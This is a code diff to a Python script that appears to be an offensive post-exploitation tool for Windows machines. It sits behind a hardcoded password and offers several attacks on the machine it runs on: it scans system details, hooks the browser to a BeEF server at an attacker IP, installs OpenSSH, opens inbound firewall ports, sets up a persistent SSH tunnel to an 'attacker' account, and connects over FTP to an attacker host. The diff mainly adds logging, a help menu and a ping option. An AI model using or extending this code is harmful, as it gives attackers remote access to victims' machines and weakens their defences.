@@ -13,6 +13,16 @@ import sys
 from time import sleep
 import platform
 import subprocess
+import logging
+
+# Configure logging
+logging.basicConfig(
+    filename="connections.log",     # log file name
+    level=logging.INFO,             # log level (INFO, DEBUG, ERROR)
+    format="%(asctime)s - %(levelname)s - %(message)s"
+)
+
+logging.info(f"Program started")
 
 #trying to find powershell path
 def find_powershell():
@@ -86,12 +96,14 @@ while True:
     askforpassword = getpass.getpass(prompt = "Enter password for the program to start: ")
     sleep(0.1)
     if askforpassword != "krtek":
-        print(Fore.RED + "Incorrect password, exiting...")
+        print(Fore.RED + "Incorrect password...")
         sleep(0.5)
     else:
         print(Fore.GREEN + "Password correct, starting program...")
         sleep(0.5)
         break
+
+logging.info(f"Program accessed with correct password")
 
 cls()
 ascii_art = """
@@ -112,7 +124,7 @@ while True:
     cls()
     print("Choose your action: ")
     print("0) Print current machine scan outcome (only usable after action 1)") 
-    sleep(0.1)
+    sleep(0.1) 
     print("")
     sleep(0.1)
     print("1) Scan this machine")
@@ -123,26 +135,53 @@ while True:
     sleep(0.1)
     print("4) Attempt a FTP connection")
     sleep(0.1)
-    print("")
+    print("5) Check IP connectivity and response")
+    sleep(0.1)
+    print("help) Show available actions")
     sleep(0.1)
     print("99) To exit the program")
     sleep(0.1)
     action = input("Your action: ")
     cls()
 
+    
+#Action help = showing available actions
+    if action == "help":
+        logging.info(f"Chosen action help to show available actions")
+        print(Fore.YELLOW + "Choose action manual: ")
+        print(" ")
+        sleep(0.1)
+        print("0) Print current machine scan outcome (only usable after action 1)") 
+        sleep(0.1)
+        print("1) Scans this machine: OS, network name, machine type, platform info, local IP address")
+        sleep(0.1)
+        print("2) Attempt to hook this machine via BeEF: requires BeEF running on attacker machine")
+        sleep(0.1)
+        print("3) Attempt a local SSH connection: requires openSSH installed and configured, also requires listener script running on attacker machine")
+        sleep(0.1)
+        print("4) Attempt a FTP connection: requires FTP server running on attacker machine")
+        sleep(0.1)
+        print("5) Check IP connectivity and response: pings target/attacker IP to check connectivity and response time")
+        sleep(0.1)
+        input("Press Enter to continue...")
+
 
 #Action 0 = Printing the outcome of the scan
     if action == "0":
+        logging.info(f"Chosen action 0 to print system information")
         if scanverify == "yes":
-            print(Fore.RED + info)
+           info()
+           logging.info(f"System info printed out")
         else:
             cls()
             print("Scan was not initiated (action 1), run scan first")
+            logging.error(f"Scan not initiated, action 0 cannot proceed")
             sleep(4)
     else:
         print("")
 
     if action == "1":
+        logging.info(f"Chosen action 1 to scan the machine")
         scanverify = "yes"
         cls()
         sleep(1)
@@ -167,8 +206,18 @@ while True:
         s.close()
         sleep(1)
         input("Press Enter to continue...")
-    
-        info=system + "\n" + node + "\n" + machine + "\n" + platform_info + "\n" + ip
+
+        def info():
+            print(Fore.RED + "System: " + Fore.RED + system)
+            sleep(0.1)
+            print(Fore.RED + "Network name: " + Fore.RED + node)
+            sleep(0.1)
+            print(Fore.RED + "Machine type: " + Fore.RED + machine)
+            sleep(0.1) 
+            print(Fore.RED + "Platform info: " + Fore.RED + platform_info)
+            sleep(0.1)
+            print(Fore.RED + "Local IP address: " + Fore.RED + ip)
+            sleep(0.1)
 
     else:
         print("")
@@ -176,7 +225,8 @@ while True:
 
 #Action 2 = beef hook
     if action == "2":
-        pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$"
+        logging.info(f"Chosen action 2 to attempt beef hook")
+        pattern = r"^\d{0,3}\.\d{0,3}\.\d{0,3}\.\d{0,3}:\d+$"
         sleep(0.1)
         while True:
             beefip=input("IP that beef is running on (pure IP number with port-native port 3000): ")
@@ -185,12 +235,14 @@ while True:
                 print("Valid IP, trying hook...")
                 sleep(0.1)
                 webbrowser.open("http://" + beefip + "/hook.js")
+                logging.info(f"Opened beef hook URL: http://{beefip}/hook.js")
                 print("The hook has started...")
                 sleep(1)
                 break
 
             else:
                 print("Invalid IP input")
+                logging.error(f"Invalid IP input for beef hook: {beefip}")
                 sleep(0.1)
 
     else:
@@ -198,6 +250,7 @@ while True:
 
 #Action 3 = local SSH connection
     if action == "3":
+        logging.info(f"Chosen action 3 to attempt local SSH connection")
         print(Fore.RED + "!!!Warning, you need to run a script on the attacker side aswell to conenct!!!")
         while True:
             attackerscriptcontinue=input("Continue? y/n: ")
@@ -208,6 +261,7 @@ while True:
             elif attackerscriptcontinue == "y":
                 skip=input("Skip openSSH install and config? (for first program startup not recommended)  y/n: ")
                 if skip == "n":
+                    logging.info(f"Proceeding with openSSH installation and configuration")
                     #installing OpenSSH Client and Server via PowerShell commands
                     #link for the openSSH installation: https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse?tabs=powershell&pivots=windows-10
                     installsshd="Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0"
@@ -231,7 +285,16 @@ while True:
                     fwr9000 = 'New-NetFirewallRule -DisplayName "Allow SSH Tunnel 9000" -Direction Inbound -Protocol TCP -LocalPort 9000 -Action Allow'
                     run_ps(fwr9000)
                     sleep(2)
-                else:        
+
+                    #stating the PS comand to persistent SSH tunnel
+                    attackeruser=input("Enter attacker SSH username: ")
+                    sleep(0.1)
+                    attackerip=input("Enter attacker IP (without port): ")
+                    sleep(0.1)
+                    correctsshinput=input("You put " + attackeruser + " as the attacker user, and " + attackerip + " as attacker IP, correct? y/n: ")
+                    sleep(0.1)
+                else:
+                    logging.info(f"Skipping openSSH installation and configuration")        
                     #stating the PS comand to persistent SSH tunnel
                     attackeruser=input("Enter attacker SSH username: ")
                     sleep(0.1)
@@ -258,19 +321,27 @@ while True:
                 sleep(0.1)
                 break
     if action == "4":
+        logging.info(f"Chosen action 4 to attempt FTP connection")
         fwr21 = 'New-NetFirewallRule -DisplayName "Allow FTP 21" -Direction Inbound -Protocol TCP -LocalPort 21 -Action Allow'
         run_ps(fwr21)
         ftpuser=input("Enter attacker user: ")
         ftpIP=input("Enter attacker IP: ")
-        ftpconnect="ftp "+ftpuser+"@"+ftpIP
+        ftpconnect=r".\ftp "+ftpuser+"@"+ftpIP
         run_ps(ftpconnect)
-    
+
+    if action == "5":
+        logging.info(f"Chosen action 5 to check IP connectivity and response")
+        targetip=input("Enter target IP to ping: ")
+        pingcommand="ping " + targetip
+        run_ps(pingcommand)
+        
     else:
         print("")
         sleep(0.1)
 
 #Action 99 = exiting the program
     if action == "99":
+        logging.info(f"Chosen action 99 to exit the program")
         print("Exiting the program...")
         sleep(3)
         exit()
